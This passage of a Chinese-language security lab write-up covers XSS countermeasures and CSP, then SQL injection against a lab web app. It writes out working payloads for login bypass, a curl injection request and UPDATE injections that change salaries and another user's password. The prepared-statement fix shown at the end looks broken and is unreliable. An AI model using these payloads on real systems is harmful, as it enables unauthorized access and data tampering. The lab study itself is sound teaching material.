PHP’s built-in method htmlspecialchars() to encode the special characters in user input, such as encoding “&lt;” to “<code>&amp;lt;</code>“, “&gt;” to “<code>&amp;gt;</code>“, etc. This method is invoked in dropdown.php, text.php, and url.php inside the vendor&#x2F;elgg&#x2F;elgg&#x2F;views&#x2F;default&#x2F;output&#x2F; folder. We have commented them out to turn off the countermeasure.</p><p><strong>中文翻译：</strong><br>这个小节仅供信息参考，没有特定的任务要做。它展示了Elgg如何防御XSS攻击。Elgg确实有内置的对策，我们已经禁用了它们以使攻击生效。实际上，Elgg使用了两种对策。一种是自定义构建的安全插件HTMLawed，它验证用户输入并从输入中移除标签。我们已经在input.php中的filter_tags()函数内注释掉了插件的调用，该函数位于vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;lib&#x2F;。请看以下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_tags</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// return elgg_trigger_plugin_hook(&#x27;validate&#x27;, &#x27;input&#x27;, null, $var);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了HTMLawed，Elgg还使用PHP内置的htmlspecialchars()方法来编码用户输入中的特殊情况，例如将”&lt;”编码为”<code>&amp;lt;</code>“，”&gt;”编码为”<code>&amp;gt;</code>“等。这个方法在vendor&#x2F;elgg&#x2F;elgg&#x2F;views&#x2F;default&#x2F;output&#x2F;文件夹中的dropdown.php、text.php和url.php中被调用。我们已经注释掉了它们以关闭对策。</p><h2 id="Task7-Defeating-XSS-Attacks-Using-CSP"><a href="#Task7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="Task7: Defeating XSS Attacks Using CSP"></a>Task7: Defeating XSS Attacks Using CSP</h2><p>CSP，即内容安全策略（Content Security Policy），是一种安全机制，用于帮助保护网站免受<code>XSS</code>和<code>ClickJacking</code>攻击。CSP通过定义并实施一组策略规则，限制了网页中可以加载和执行的资源来源以及允许执行的脚本，从而增强了网站的安全性。</p><p><strong>分析：</strong></p><p><code>example60|70</code>服务器用于托管<code>js</code>代码文件。</p><p><code>example32(a|b|c) </code>服务器托管相同的网页<code>index.html</code>，该网页用于演示CSP 的工作原理。</p><ul><li>在该页面中，有六个区域，area1 至area6。</li><li>最初，每个区域都显示“Faild”。该页面还包括六段 JavaScript 代码，每段都试图在其相应区域写入“OK”。如果某个区域可以看到OK，则说明该区域对应的JavaScript代码已经成功执行；否则，我们会看到失败。其中，area1-3如果显示OK，那么表示代码段中的js代码执行成功；如果area4显示OK，那么表示该本机中的js代码文件被执行成功；如果area5显示OK，那么表示example60服务器上的js代码执行成功；如果area6显示OK，那么表示example70服务器上的js代码执行成功。</li></ul><p>所以我们通过修改CSP配置文件，查看example32(a|b|c)的6个area情况分析CSP是如何工作的。</p><h3 id="Q1：Describe-and-explain-your-observations-when-you-visit-these-websites"><a href="#Q1：Describe-and-explain-your-observations-when-you-visit-these-websites" class="headerlink" title="Q1：Describe and explain your observations when you visit these websites."></a><strong>Q1</strong>：Describe and explain your observations when you visit these websites.</h3><p>登录example32a.com，发现每一个area都是OK，因为没有为example32a.com设置任何的CSP，</p><p>登录example32b.com发现只有self和example70服务器上的js代码被执行了，查看配置文件发现刚好与之对应，</p><p>登录example32c.com发现1，4，6area显示为OK，</p><ul><li>example32c的CSP配置并没有像example32a|b那样写在apache_csp.conf文件中，但是example32c的入口点为phpindex.php，所以example32c的CSP配置是在phpindex.php中实现的，如下所示，</li></ul><p>因为，CSP由web服务器设置为HTTP标头，有两种典型的设置标头的方法，</p><ul><li>一种是由web服务器（如Apache）设置，</li><li>另一种是通过web应用程序设置。</li></ul><p>example32a|b就是前者，example32c就是后者。</p><h3 id="Q2：Click-the-button-in-the-web-pages-from-all-the-three-websites-describe-and-explain-your-observations"><a href="#Q2：Click-the-button-in-the-web-pages-from-all-the-three-websites-describe-and-explain-your-observations" class="headerlink" title="Q2：Click the button in the web pages from all the three websites, describe and explain your observations."></a>Q2：Click the button in the web pages from all the three websites, describe and explain your observations.</h3><p>只有example32a.com的按钮才有效，即下面的js代码只有在example32a服务器上才能被执行，</p><p>因为example32b|c都设定了js代码的“白名单”，而上面的按钮对应的js代码并不在其中，所以在example32b|c服务器上点击按钮没有反应，而example32a并未设置任何防护，所以按钮有效，</p><ul><li>a:弹出js代码执行成功的弹窗，因为没有CSP保护；</li><li>b:无响应，有CSP header限制；</li><li>c:无响应，有CSP header限制</li></ul><h3 id="Q3：Change-the-server-configuration-on-example32b-modify-the-Apache-configuration-so-Areas-5-and-6-display-OK-Please-include-your-modified-configuration-in-the-lab-report"><a href="#Q3：Change-the-server-configuration-on-example32b-modify-the-Apache-configuration-so-Areas-5-and-6-display-OK-Please-include-your-modified-configuration-in-the-lab-report" class="headerlink" title="Q3：Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report."></a>Q3：Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.</h3><p>我们修改apach_csp.conf，暂停容器，docker-compose build重新配置docker，docker-compose up开启</p><h3 id="Q4：Change-the-server-configuration-on-example32c-modify-the-PHP-code-so-Areas-1-2-4-5-and-6-all-display-OK-Please-include-your-modified-configuration-in-the-lab-report"><a href="#Q4：Change-the-server-configuration-on-example32c-modify-the-PHP-code-so-Areas-1-2-4-5-and-6-all-display-OK-Please-include-your-modified-configuration-in-the-lab-report" class="headerlink" title="Q4：Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report."></a>Q4：Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.</h3><p>根据要求修改phpindex.php文件，暂停容器，docker-compose build重新配置docker，docker-compose up开启，</p><h3 id="Q5：Please-explain-why-CSP-can-help-prevent-Cross-Site-Scripting-attacks"><a href="#Q5：Please-explain-why-CSP-can-help-prevent-Cross-Site-Scripting-attacks" class="headerlink" title="Q5：Please explain why CSP can help prevent Cross-Site Scripting attacks."></a>Q5：Please explain why CSP can help prevent Cross-Site Scripting attacks.</h3><blockquote><p>CSP可以严格控制哪些js代码可以被执行，而XSS攻击就是要让受害者的浏览器执行特定的恶意js代码，如果此恶意js代码不再CSP允许的范围内，那么它就不会被执行，所以XSS攻击会失败。</p><p>所以，CSP就像是一个白名单政策，只让受信任的js代码被执行。</p></blockquote><p>CSP 本质上是建立白名单，规定了浏览器只能够执行特定来源的代码；即使发生了xss攻击，也不会加载来源不明的第三方脚本。Task7中的Area1~7全是内嵌的JavaScript代码，因此引入CSP Header后将不会执行，只能通过设置白名单(Content-Security-Policy)来确认哪些脚本可放行。</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><strong>XSS防范措施</strong></p><ul><li>HttpOnly属性：指示浏览器禁止任何脚本访问cookie内容</li><li>安全编码：对特殊字符进行安全编码，如尖括号（”&lt;“表示为<code>&amp;lt</code>）</li><li>CSP Header：建立白名单，规定了浏览器只能够执行特定来源的代码</li></ul><p><strong>XSS危害</strong></p><ul><li><strong>网络钓鱼</strong>，包括盗取各类用户账户</li><li><strong>窃取用户cookie</strong>，获取用户隐私信息，或利用好用户身份进行其他操作</li><li><strong>会话劫持</strong>，从而执行任意操作，如非法转账、发送邮件</li><li>强制弹出广告页面、刷流量</li><li><strong>网页挂马</strong>：攻击者将恶意脚本隐藏在Web网页中，当用户浏览该网页时，这些隐藏的恶 意脚本将在用户不知情的情况下执行，下载并启动木马程序。</li><li>进行恶意操作，如篡改页面信息</li><li>进行大量的客户端攻击，如DDOS</li><li><strong>信息刺探</strong>，提取客户端信息，如浏览历史，端口信息、键盘信息</li><li><strong>控制受害者机器</strong>向其他网站发起攻击</li><li>结合其他漏洞如CSRF</li><li>提升用户权限，进一步渗透网站</li><li><strong>传播XSS蠕虫</strong>：将一段JavaScript代码保存在服务器上，其他用户浏览 相关信息时，会执行JavaScript代码，从而引发攻击</li></ul><h1 id="Lab8-SQL注入实验"><a href="#Lab8-SQL注入实验" class="headerlink" title="Lab8-SQL注入实验"></a>Lab8-SQL注入实验</h1><blockquote><p>#注释；curl（发送URL）命令行注入</p><p>两条语句执行：query()改为multi_query()，可以实现多个查询</p><p>Update修改字段，自己OR他人</p><p>对策：使用prepared statement（预编译处理），使得代码和数据分离</p><p>第一步是只发送代码部分，不包含实际数据的SQL语句，实际数据被问号(?）取代。然后使用bind param ()将数据发送到数据库。数据库只会将这一步发送的所有数据视为数据，而不再是代码，因此不执行</p></blockquote><h2 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1. Get Familiar with SQL Statements"></a>Task 1. Get Familiar with SQL Statements</h2><p>进入开放数据库服务的容器的shell，进入数据库服务。</p><p>选择数据库中的表，打印期中的信息。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 22.13.31.png" alt="截屏2025-01-02 22.13.31" style="zoom:50%;" /><h2 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2. SQL Injection Attack on SELECT Statement"></a>Task 2. SQL Injection Attack on SELECT Statement</h2><p>本次task的目标是在不知道任何一个employee的密码的情况下从主页登录。</p><p>实验手册给出了前端的验证代码，对代码进行简单的审计即可发现前端验证系统存在<code>sql</code>注入漏洞。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password</span><br><span class="line">FROM credential</span><br><span class="line">WHERE name= &#x27;$input_uname&#x27; and Password=&#x27;$hashed_pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这条sql语句是根据用户名和密码匹配的规则挑选出对应的记录，用户登录的处理逻辑是根据下面的sql语句的查询结果（返回值），判断以哪个id登录，没有返回结果不允许登录，所以我们即使不知道正确的密码，只要让<strong>下面的sql语句有返回结果</strong>就可以绕开验证过程，</p><ul><li>在sql注入中常用的一种手法是构造<strong>1&#x3D;1恒等式绕过</strong>，这样的条件会让select语句的条件失效</li><li><strong>Mysql中使用单引号引用字段</strong>，针对这种格式，经常构造单引号提前结束条件判断</li></ul><p>并没有对要输入的<code>username</code>和<code>password</code>进行处理的代码，但是由于<code>password</code>要进行<code>hash</code>运算，所以<code>password</code>的值不好控制，可以选择构造<code>username</code>的值实现<code>sql</code>注入。</p><h3 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1 SQL Injection Attack from webpage"></a>Task 2.1 SQL Injection Attack from webpage</h3><p>在网页上进行<code>sql</code>注入，在知道管理员账号为<code>admin</code>的情况下登录管理员账号。</p><p><strong>实验步骤：</strong></p><p>根据上面的条件，我们对于用户名的输入，首先构造<code>admin&#39;</code>结束后端对用户名的判断，但我们不知道密码，所以在最后加上mysql的注释符<code>#</code>（当然也可以使用<code>--空格</code>，这在sql语句中也表示注释，使后面对密码的判断失效，攻击效果如下，</p><p>将构造好的<code>username</code>值输入，直接登录，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure><p>或者，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; -- </span></span><br></pre></td></tr></table></figure><p>点击Login直接登陆成功了，此时的sql语句就变成了</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, eid, salary, birth, ssn, address, email, nickname,Password <span class="keyword">FROM</span> credential <span class="keyword">WHERE</span> name<span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> #<span class="string">&#x27; and Password=&#x27;</span>$hashed_pwd<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>因为验证部分没有对输入进行检查处理，并且代码逻辑不够完善，我们构造<code>username</code>的值使原始的<code>sql</code>语句中途截断，<code>name = admin’ --空格  </code>(最后有一个空格)</p><p>使得<code>sql</code>语句变成了 <code>SELECT * FROM credential WHERE name = ‘admin’ --  and Password =...</code></p><p>由于<code>#</code> 、<code>--空格</code>  在sql语句中表示注释，所以后面对Password的判断没有生效，所以查询出来的结果就是<code>admin</code>的信息，根据后面代码的逻辑，就可以成功以<code>admin</code>的身份登录。最后的<code>;</code>不会被注释掉。</p><h3 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2 SQL Injection Attack from command line"></a>Task 2.2 SQL Injection Attack from command line</h3><p>使用命令行发送http请求完成sql注入。</p><blockquote><p><strong>curl</strong>是一个用于在网络上传输数据并支持多种协议的命令行工具。</p><p>浏览器的url栏已经将特殊字符转义，我们只需再根据指导书的提示将**单引号转义成27%**即可，</p><p>得到结果如下，发现成功获取到了应该被渲染在前端的数据。</p></blockquote><p>注意：使用curl命令时，如果有特殊符号（如&amp;），需要放在同网址一起放在单引号中，不然会被shell编译。其次，在网址中的一些符号需要被url编码，比如说单引号、空格等。</p><p><strong>实验步骤</strong>：</p><p>登录时发送的的http请求为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://www.seed-server.com/unsafe_home.php?username=alice&amp;Password=11&#x27;</span></span><br></pre></td></tr></table></figure><p>同样，我们还是构造恶意的<code>username</code>，实现<code>sql</code>注入的效果，不过需要对单引号和空格进行<code>url</code>编码。</p><p>所以我们在终端的输入为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://www.seed-server.com/unsafe_home.php?username=admin%27--%20&amp;Password=&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>%27是单引号的url编码</li><li>%20是空格的url编码</li></ul><p><strong>分析：</strong></p><p>Sql注入的原理与上一个小实验仍然是相同的，只是本次实验使用curl在命令行上进行操作，需要额外对特殊字符进行url编码。</p><h3 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3 Append a new SQL statement"></a>Task 2.3 Append a new SQL statement</h3><p>在前两次task中，都是通过sql注入从数据库拿数据，如果可以修改数据库就更好了，在SQL中，分号<code>；</code>用来分割两个sql语句，在本次task中需要在登陆界面尝试执行两个sql语句。</p><p>但是对抗机制会阻止两个sql语句的运行，我们需要找出对抗机制是什么。</p><p><strong>实验步骤：</strong></p><p>先尝试分号的效果，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> credential <span class="keyword">where</span> Name <span class="operator">=</span> ‘Alice’ ; <span class="keyword">select</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>的确执行了两条sql语句，证明分号确实可以用来分割sql语句。</p><p>下面在登录页面上使用sql注入构造两个sql语句。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; ; select 1; -- </span></span><br></pre></td></tr></table></figure><p>点击登陆后，提示语法错误，无法执行第二条sql语句。</p><p><strong>分析：</strong></p><p>执行失败了，通过查看unsafe_home.php发现其使用query函数执行sql语句。</p><blockquote><p>查询<code>php</code>的<code>mysqli::query</code>函数：</p><p>此函数只能一次执行一个<code>sql</code>语句，如果需要一次执行多条<code>SQL</code>命令，就必须使用<code>mysqli</code>对象中的<code> multi_query()</code>方法。具体做法是把多条SQL命令写在同一个字符串里作为参数传递给<code>multi_query()</code>方法，多条SQL之间使用分号 (;)分隔。</p></blockquote><p>要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中<code>mysqli_multi_query()</code>函数,这个函数在支持同时执行多条sql语句,而与之对应的<code>mysqli_query()</code>函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数。</p><p>因为代码中使用的query函数来执行sql语句，所以当输入的是多条sql命令的时候，query无法处理，不会成功执行。</p><h2 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3. SQL Injection Attack on UPDATE Statement"></a>Task 3. SQL Injection Attack on UPDATE Statement</h2><p>在task2中，sql注入漏洞发生在SELECT语句处，所以我们可以利用此漏洞获取数据库内的信息。但如果sql漏洞发生在UPDATE语句处，后果将会非常严重，因为我们可以通过注入，在UPDATE的基础上对数据库中的数据做修改。</p><p>实验说明中给出了employee修改个人资料的代码逻辑：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hashed_pwd</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$input_pwd</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE credential SET</span></span><br><span class="line"><span class="string">          nickname=&#x27;<span class="subst">$input_nickname</span>&#x27;,</span></span><br><span class="line"><span class="string">          email=&#x27;<span class="subst">$input_email</span>&#x27;,</span></span><br><span class="line"><span class="string">          address=&#x27;<span class="subst">$input_address</span>&#x27;,</span></span><br><span class="line"><span class="string">          Password=&#x27;<span class="subst">$hashed_pwd</span>&#x27;,</span></span><br><span class="line"><span class="string">          PhoneNumber=&#x27;<span class="subst">$input_phonenumber</span>&#x27;</span></span><br><span class="line"><span class="string">          WHERE ID=<span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>可以看出，代码并没有对输入的数据进行进一步的检测和处理，所以在修改个人资料的功能处是存在sql注入漏洞的。在接下来的小task中，会利用此漏洞修改数据库中的数据。</p><h3 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1 Modify your own salary"></a>Task 3.1 Modify your own salary</h3><p>对于每一个employee，只能修改Nickname、emails等数据，无法修改Salary，本次task的目标就是以employee的身份登录并且利用sql注入漏洞修改自己的salary。</p><p><strong>实验步骤：</strong></p><p>登录Alice的账户，打开编辑个人信息的页面，在Nickname栏输入进行构造的数据，执行sql注入。</p><p>注入内容如下，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">wuzhenghan coming<span class="operator">!</span><span class="string">&#x27;,Salary=&#x27;</span><span class="number">999999</span></span><br></pre></td></tr></table></figure><p>点击save提交，再查看Alice的信息可以发现Salary已经被修改了。</p><p><strong>分析：</strong></p><p>Salary的值被修改了，表明Salary&#x3D;’999999’被执行了。</p><h3 id="Task-3-2-Modify-other-people’s-salary"><a href="#Task-3-2-Modify-other-people’s-salary" class="headerlink" title="Task 3.2 Modify other people’s salary"></a>Task 3.2 Modify other people’s salary</h3><p>本次task的目标是将上司Boby的工资改为1。</p><p><strong>实验步骤：</strong></p><p>根据sql漏洞构造特殊的输入。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">joker<span class="operator">!</span><span class="string">&#x27;,salary=1 where name=&#x27;</span>Boby<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure><p>点击Save，提交表单，然后查看Boby的工资发现的确被修改为1。</p><p><strong>分析：</strong></p><p>原理同上，利用sql漏洞将<code>Salary=’1’</code>插入要执行的sql语句中。</p><p>只是在task3.2中需要用WHERE条件对Boby进行定位，所以需要用注释符<code>--空格</code>将后面的无关的sql语句部分注释掉，如果不注释掉就会有两个WHERE条件，出现语法错误。</p><h3 id="Task-3-3-Modify-other-people’s-password"><a href="#Task-3-3-Modify-other-people’s-password" class="headerlink" title="Task 3.3 Modify other people’s password"></a>Task 3.3 Modify other people’s password</h3><p>在Task3.2中，我们登录Alice的账户，通过sql漏洞修改了上司Boby的工资。本次Task的目标是通过sql漏洞修改Boby的password，进而我们可以用新的password登录Boby的账户。</p><p><strong>注意：数据库中存放的密码是原密码经过散列运算的值，所以如果要直接修改Password，就必须要先得到其散列运算的值。</strong></p><p>查看源代码<code>unsafe_edit_backend.php</code>，我们可以知道散列函数为SHA1，</p><p><strong>实验步骤：</strong></p><p>假设要Boby的password改为<code>joker</code>，先获得<code>SHA1(&#39;joker&#39;)</code>，使用命令<code>echo -n &quot;joker&quot;|sha1sum</code>，来获取明文密码的散列值，</p><p>得到的散列值为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6c973e8803b3fbaabfb09dd916e295ed24da1d43</span><br></pre></td></tr></table></figure><p>根据sql漏洞构造特殊的输入，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hello boby<span class="string">&#x27;,password=&#x27;</span><span class="number">6</span>c973e8803b3fbaabfb09dd916e295ed24da1d43<span class="string">&#x27; where name=&#x27;</span>Boby<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure><p>我们的输入会使得后端真正执行的sql语句为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> credential</span><br><span class="line"><span class="keyword">SET</span> nickname<span class="operator">=</span>&quot;hello boby&quot;,</span><br><span class="line">    password<span class="operator">=</span>SHA1(<span class="string">&#x27;joker&#x27;</span>)</span><br><span class="line"><span class="keyword">WHERE</span> Name<span class="operator">=</span><span class="string">&#x27;Boby&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这会将Boby的密码改为SHA1(‘joker’)，</p><p>我们在登陆界面用这个密码(joker)登录Boby的账号，</p><p>发现可以成功登录。</p><p><strong>分析：</strong></p><p>注入的原理仍然与前两次实验相同，都是通过将想要执行的sql语句插入到原来的sql语句中，然后再使用WHERE对Boby进行定位，最后使用注释符<code>-- 空格</code>将多余的sql语句部分注释。</p><p>但值得注意的是，Password在数据库中是以散列值的方式存储的，所以直修改Password进行修改时，要先获得新密码的散列值，将散列值存入数据库，而不是新密码本身。</p><h2 id="Task-4-Countermeasure-Prepared-Statement"><a href="#Task-4-Countermeasure-Prepared-Statement" class="headerlink" title="Task 4. Countermeasure - Prepared Statement"></a>Task 4. Countermeasure - Prepared Statement</h2><p>在本次task中，介绍了如何用预处理的方式处理防止sql注入；在实验说明中，介绍了sql服务器对于前端传递的sql语句的处理过程。</p><p>在数据库系统中，当执行一个SQL查询时，会经历几个关键的阶段，这些阶段包括解析和规范化（Parsing and Normalization）、编译（Compilation）、查询优化（Query Optimization）和缓存（Cache）。以下是每个阶段的详细解释：</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 22.33.06.png" alt="截屏2025-01-02 22.33.06" style="zoom:50%;" /><p><strong>Parsing and Normalization Phase</strong></p><p>这是SQL查询处理的第一阶段，在这个阶段中，查询的文本被分析并转换成数据库系统能理解的结构化表示形式。</p><ul><li>解析（Parsing）：解析器首先检查SQL查询语法是否正确。它将SQL文本分解成个别的元素，并构建一个初始的内部数据结构，通常是一种称为解析树（Parse Tree）的东西。</li><li>规范化（Normalization）：在解析树创建之后，数据库进一步处理这个树来产生一个规范化的查询。这包括消除歧义、应用优化规则（如推导出表达式的简化版）以及转换成一个标准形式。</li></ul><p><strong>Compilation Phase</strong></p><p>一旦SQL查询被解析和规范化，它就会被编译成数据库可以执行的形式。</p><ul><li>编译：编译阶段涉及将规范化的查询转换成一个或多个执行计划。执行计划是一系列数据库操作（如扫描、连接、排序等）的集合，这些操作定义了如何从数据库中检索或修改数据。</li></ul><p><strong>Query Optimization Phase</strong></p><p>在编译阶段创建的执行计划可能不是最有效的。查询优化器的任务是找到最佳的执行计划。</p><ul><li>查询优化：优化器评估不同的执行计划，并选择成本最低（例如，执行时间最短、资源使用最少）的计划。这个选择是基于数据库的统计信息，如表的大小、索引的存在以及数据分布情况。</li></ul><p><strong>Cache Phase</strong></p><p>最优的执行计划可能会被缓存以便将来重用，这样在处理相同或相似的查询时可以节省优化和编译的时间。</p><p><strong>对于预处理的理解：</strong></p><p>预处理指的是预先将SQL语句编译并优化，然后在实际执行时再提供具体的参数值。</p><ol><li>那么对于预处理的sql语句，只需要经历一次Parsing and Normalization Phase，SQL语句被解析为一个解析树，并进行规范化，此时占位符代替了实际的参数值。</li><li>之后也会经历Compilation Phase，转换为一个内部的执行计划，但由于还没有提供参数值，所以编译生成的执行计划会考虑到各种可能的参数。</li><li>在Query Optimization Phase，sql系统的优化器会为这个没有具体参数值的SQL语句生成最优的执行计划。由于没有具体的参数值，优化器可能会选择一个适用于各种可能参数的通用执行计划。</li><li>进入Cache Phase，编译和优化后的执行计划会被缓存。对于预处理语句，这意味着当相同的语句需要被重复执行时，它可以直接使用缓存中的执行计划，无需重新经历解析、编译和优化阶段。</li></ol><p><strong>预处理的好处：</strong></p><p><u><em>预处理语句通过使用占位符来提供参数，从而避免了SQL注入攻击的风险</em></u>。参数不会被解释为SQL的一部分，因此不能改变执行计划的结构。并且预处理语句通常只需要解析、编译和优化一次，会提高程序的性能。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT name, local, gender FROM USER_TABLE WHERE id=$id AND password=&#x27;$pwd&#x27;&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>$conn<span class="operator">-</span><span class="operator">&gt;</span>query($<span class="keyword">sql</span>)</span><br><span class="line"></span><br><span class="line">上面的代码容易受到<span class="keyword">SQL</span>注入攻击。它可以重写为以下形式：</span><br><span class="line"></span><br><span class="line">$stmt<span class="operator">=</span>$conn<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">prepare</span>(&quot;SELECT name, local, gender FROM USER_TABLE WHERE id=? AND password=?&quot;);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 将参数绑定到查询</span><br><span class="line">$stmt<span class="operator">-</span><span class="operator">&gt;</span>bind_param(&quot;is&quot;, $id, $pwd);</span><br><span class="line">$stmt<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">execute</span>();</span><br><span class="line">$stmt<span class="operator">-</span><span class="operator">&gt;</span>bind_result($bind_name, $bind_local, $bind_gender);</span><br><span class="line">$stmt<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">fetch</span>();</span><br></pre></td></tr></table></figure><p><strong>prepared statement</strong>出现在编译之后，执行步骤之前，编译后的语句只包含空的数据占位符（placeholder），而不包含实际的语句，将实际的数据直接插入占位符中即可明确代码和数据的边界，</p><p>实际数据被问号<code>?</code>所取代，使用<code>bind_param()</code>函数将数据填入占位符中，其中<code>is</code>表示参数的类型：<code>i</code>表示<code>$id</code>中是整数类型，<code>s</code>表示<code>$pwd</code>是字符串类型。</p><p>所以本次task的目标就是利用预处理修复sql注入漏洞。</p><p><strong>实验步骤：</strong></p><p>登录&#x2F;defense网页，此网页具有sql注入漏洞，</p><p>我们对username栏进行sql注入，发现可以成功登录admin的账号。</p><p>注入命令为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; -- </span></span><br></pre></td></tr></table></figure><p>查看unsafe.php源码，发现其并没有采用过滤输入或者预处理的方式来预防sql注入，这使得我们很容易就可以登录任意账户。</p><p>下面对unsafe.php进行修改，采用预处理的方式对sql注入进行防御，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// create a connection</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">getDB</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT id, name, eid, salary, ssn</span></span><br><span class="line"><span class="string">FROM credential</span></span><br><span class="line"><span class="string">WHERE name = ? and password = ? &quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$input_uname</span>, <span class="variable">$hashed_pwd</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// do the query</span></span><br><span class="line"><span class="comment">// $result = $conn-&gt;query(&quot;SELECT id, name, eid, salary, ssn</span></span><br><span class="line"><span class="comment">//                         FROM credential</span></span><br><span class="line"><span class="comment">//                         WHERE name= &#x27;$input_uname&#x27; and Password= &#x27;$hashed_pwd&#x27;&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// only take the first row </span></span><br><span class="line">  <span class="variable">$firstrow</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">  <span class="variable">$id</span>     = <span class="variable">$firstrow</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">  <span class="variable">$name</span>   = <span class="variable">$firstrow</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  <span class="variable">$eid</span>    = <span class="variable">$firstrow</span>[<span class="string">&quot;eid&quot;</span>];</span><br><span class="line">  <span class="variable">$salary</span> = <span class="variable">$firstrow</span>[<span class="string">&quot;salary&quot;</span>];</span><br><span class="line">  <span class="variable">$ssn</span>    = <span class="variable">$firstrow</span>[<span class="string">&quot;ssn&quot;</span>];</span><br><span 